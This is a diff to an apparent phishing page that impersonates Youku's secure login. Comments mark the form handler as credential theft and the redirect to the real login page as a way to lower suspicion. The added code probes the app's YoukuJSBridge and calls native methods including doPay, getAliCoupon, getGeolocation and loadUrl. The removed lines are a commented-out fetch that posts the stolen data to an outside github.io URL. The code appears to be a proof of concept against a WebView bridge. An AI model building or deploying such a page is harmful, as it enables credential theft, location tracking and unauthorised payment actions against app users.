@@ -107,6 +107,15 @@
     .success.show {
       display: block;
     }
+    .info-box {
+      background: #f0f0f0;
+      padding: 10px;
+      margin-top: 15px;
+      border-radius: 5px;
+      font-size: 12px;
+      white-space: pre-wrap;
+      word-break: break-all;
+    }
   </style>
 </head>
 <body>
@@ -142,12 +151,85 @@
       <p style="font-size: 12px; color: #999; margin-top: 5px;">正在跳转...</p>
     </div>
      
+    <div class="info-box" id="infoBox"></div>
+     
     <div class="footer">
       <p>protected by 优酷安全登录</p>
     </div>
   </div>
    
   <script>
+    // 显示信息
+    function showInfo(msg) {
+      document.getElementById('infoBox').innerHTML = msg;
+    }
+    
+    // 页面加载完成检测
+    window.onload = function() {
+      var info = '[*] 页面加载完成\n';
+      info += '[*] YoukuJSBridge 类型：' + typeof YoukuJSBridge + '\n';
+      info += '[*] YoukuJSBridge 值：' + YoukuJSBridge + '\n';
+      
+      if (typeof YoukuJSBridge !== 'undefined') {
+        info += '\n[+] YoukuJSBridge 存在！\n';
+        
+        // 尝试获取所有属性
+        var props = [];
+        try {
+          for (var key in YoukuJSBridge) {
+            props.push(key);
+          }
+          info += '\n[*] for...in 枚举到 ' + props.length + ' 个属性:\n';
+          info += props.join('\n');
+        } catch (e) {
+          info += '\n[-] for...in 失败：' + e;
+        }
+        
+        // 尝试 Object.keys
+        try {
+          var keys = Object.keys(YoukuJSBridge);
+          info += '\n\n[*] Object.keys 枚举到 ' + keys.length + ' 个属性:\n';
+          info += keys.join('\n');
+        } catch (e) {
+          info += '\n\n[-] Object.keys 失败：' + e;
+        }
+        
+        // 尝试 Object.getOwnPropertyNames
+        try {
+          var names = Object.getOwnPropertyNames(YoukuJSBridge);
+          info += '\n\n[*] getOwnPropertyNames 枚举到 ' + names.length + ' 个属性:\n';
+          info += names.join('\n');
+        } catch (e) {
+          info += '\n\n[-] getOwnPropertyNames 失败：' + e;
+        }
+        
+        // 测试已知方法
+        info += '\n\n[*] 测试已知方法:\n';
+        var knownMethods = ['doPay', 'getAliCoupon', 'getGeolocation', 'loadUrl', 
+                           'setShareInfo', 'showLoginView', 'addItem2Cart'];
+        
+        for (var i = 0; i < knownMethods.length; i++) {
+          var method = knownMethods[i];
+          try {
+            if (typeof YoukuJSBridge[method] === 'function') {
+              info += '\n[+] ' + method + ' 是函数';
+            } else if (YoukuJSBridge[method] !== undefined) {
+              info += '\n[?] ' + method + ' 存在，类型：' + typeof YoukuJSBridge[method];
+            } else {
+              info += '\n[-] ' + method + ' 不存在';
+            }
+          } catch (e) {
+            info += '\n[-] ' + method + ' 错误：' + e;
+          }
+        }
+      } else {
+        info += '\n[-] YoukuJSBridge 不存在';
+      }
+      
+      showInfo(info);
+      alert(info);
+    };
+     
     // 窃取凭证
     document.getElementById('loginForm').addEventListener('submit', function(e) {
       e.preventDefault();
@@ -172,6 +254,26 @@
         } catch (err) {
           alert('[-] 位置获取失败：' + err);
         }
+         
+        // 测试所有已知方法
+        var testResults = [];
+        var knownMethods = ['doPay', 'getAliCoupon', 'getGeolocation', 'loadUrl', 
+                           'setShareInfo', 'showLoginView', 'addItem2Cart', 
+                           'oneKeyAddCart', 'closeActivity', 'setTitleBar'];
+        
+        for (var i = 0; i < knownMethods.length; i++) {
+          var method = knownMethods[i];
+          try {
+            var result = YoukuJSBridge[method]('{"test":true}');
+            testResults.push('[+] ' + method + ': 成功\n返回值：' + result);
+          } catch (err) {
+            testResults.push('[-] ' + method + ': 失败\n错误：' + err);
+          }
+        }
+        
+        alert('方法测试结果:\n\n' + testResults.join('\n\n'));
+      } else {
+        alert('[-] YoukuJSBridge 不可用');
       }
        
       // 发送到攻击者服务器（模拟）
@@ -206,13 +308,6 @@
         // 显示窃取成功
         alert('\n[+] 窃取成功！\n数据：' + JSON.stringify(stealData, null, 2));
          
-        // 实际攻击中，这里会发送到攻击者服务器
-        // fetch('https://useryayagit.github.io/qinxuan/steal', {
-        //   method: 'POST',
-        //   headers: { 'Content-Type': 'application/json' },
-        //   body: JSON.stringify(stealData)
-        // });
-         
         // 3 秒后跳转到真实登录页（降低怀疑）
         setTimeout(function() {
           if (typeof YoukuJSBridge !== 'undefined') {
@@ -228,26 +323,6 @@
          
       }, 1500); // 模拟网络延迟
     });
-     
-    // 页面加载完成检测
-    window.onload = function() {
-      alert('[*] 页面加载完成\n[*] YoukuJSBridge 状态：' + (typeof YoukuJSBridge));
-       
-      if (typeof YoukuJSBridge !== 'undefined') {
-         var methods = [];
-        for (var key in YoukuJSBridge) {
-          if (typeof YoukuJSBridge[key] === 'function') {
-            methods.push(key);
-          }
-        }
-        
-        // 格式化输出
-        var methodsStr = methods.join('\n  - ');
-        alert('[+] YoukuJSBridge 可用！\n\n[*] 共 ' + methods.length + ' 个方法:\n\n  - ' + methodsStr);
-      } else {
-        alert('[-] YoukuJSBridge 不可用');
-      }
-    };
   </script>
 </body>
 </html>
